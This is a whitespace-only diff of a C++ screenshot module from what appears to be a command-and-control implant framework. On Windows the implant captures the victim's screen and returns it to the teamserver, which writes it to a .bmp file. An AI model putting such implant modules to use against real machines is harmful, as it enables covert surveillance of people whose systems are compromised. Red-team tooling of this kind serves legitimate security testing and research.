@@ -34,9 +34,9 @@ __attribute__((visibility("default"))) ScreenShot* ScreenShotConstructor()
 
 ScreenShot::ScreenShot()
 #ifdef BUILD_TEAMSERVER
-	: ModuleCmd(std::string(moduleName), moduleHash)
+    : ModuleCmd(std::string(moduleName), moduleHash)
 #else
-	: ModuleCmd("", moduleHash)
+    : ModuleCmd("", moduleHash)
 #endif
 {
 }
@@ -49,32 +49,32 @@ ScreenShot::~ScreenShot()
 
 std::string ScreenShot::getInfo()
 {
-	std::string info;
-	// TODO: add screenshot every x seconds with a recurringExec
+    std::string info;
+    // TODO: add screenshot every x seconds with a recurringExec
 #ifdef BUILD_TEAMSERVER
-	info += "ScreenShot:\n";
-	info += "ScreenShot\n";
-	info += "exemple:\n";
-	info += "- ScreenShot\n";
+    info += "ScreenShot:\n";
+    info += "ScreenShot\n";
+    info += "exemple:\n";
+    info += "- ScreenShot\n";
 #endif
-	return info;
+    return info;
 }
 
 
 int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 {
 #if defined(BUILD_TEAMSERVER) || defined(BUILD_TESTS) 
-	if (splitedCmd.size() >= 1 )
-	{
-		c2Message.set_instruction(splitedCmd[0]);	
-	}
-	else
-	{
-		c2Message.set_returnvalue(getInfo());
-		return -1;
-	}
+    if (splitedCmd.size() >= 1 )
+    {
+        c2Message.set_instruction(splitedCmd[0]);    
+    }
+    else
+    {
+        c2Message.set_returnvalue(getInfo());
+        return -1;
+    }
 #endif
-	return 0;
+    return 0;
 }
 
 
@@ -83,33 +83,33 @@ int ScreenShot::init(std::vector<std::string> &splitedCmd, C2Message &c2Message)
 
 int ScreenShot::process(C2Message &c2Message, C2Message &c2RetMessage)
 {
-	c2RetMessage.set_instruction(c2RetMessage.instruction());
+    c2RetMessage.set_instruction(c2RetMessage.instruction());
 
 #ifdef _WIN32
-	std::vector<unsigned char> dataScreen;
+    std::vector<unsigned char> dataScreen;
     ScreenShooter::CaptureScreen(dataScreen);
 
-	std::string buffer(dataScreen.begin(), dataScreen.end());
-	c2RetMessage.set_data(buffer);
+    std::string buffer(dataScreen.begin(), dataScreen.end());
+    c2RetMessage.set_data(buffer);
 
-	c2RetMessage.set_returnvalue("Success");
-#endif	
+    c2RetMessage.set_returnvalue("Success");
+#endif    
 
-	return 0;
+    return 0;
 }
 
 
 int ScreenShot::errorCodeToMsg(const C2Message &c2RetMessage, std::string& errorMsg)
 {
 #ifdef BUILD_TEAMSERVER
-	int errorCode = c2RetMessage.errorCode();
-	if(errorCode>0)
-	{
-		if(errorCode==ERROR_OPEN_FILE)
-			errorMsg = "Failed: Couldn't open file";
-	}
+    int errorCode = c2RetMessage.errorCode();
+    if(errorCode>0)
+    {
+        if(errorCode==ERROR_OPEN_FILE)
+            errorMsg = "Failed: Couldn't open file";
+    }
 #endif
-	return 0;
+    return 0;
 }
 
 
@@ -134,9 +134,9 @@ std::string getFilenameTimestamp()
 
 int ScreenShot::recurringExec(C2Message& c2RetMessage) 
 {
-	// TODO
-	
-	return 1;
+    // TODO
+    
+    return 1;
 }
 
 
@@ -144,16 +144,16 @@ int ScreenShot::recurringExec(C2Message& c2RetMessage)
 int ScreenShot::followUp(const C2Message &c2RetMessage)
 {
 #ifdef BUILD_TEAMSERVER
-	const std::string buffer = c2RetMessage.data();
+    const std::string buffer = c2RetMessage.data();
 
-	if(buffer.size()>0)
-	{
-		std::string outputFile = "screenShot" + getFilenameTimestamp() + ".bmp";
-		std::ofstream output(outputFile, std::ios::binary);
-		output << buffer;
-		output.close();
-	}
+    if(buffer.size()>0)
+    {
+        std::string outputFile = "screenShot" + getFilenameTimestamp() + ".bmp";
+        std::ofstream output(outputFile, std::ios::binary);
+        output << buffer;
+        output.close();
+    }
 #endif
 
-	return 0;
+    return 0;
 }
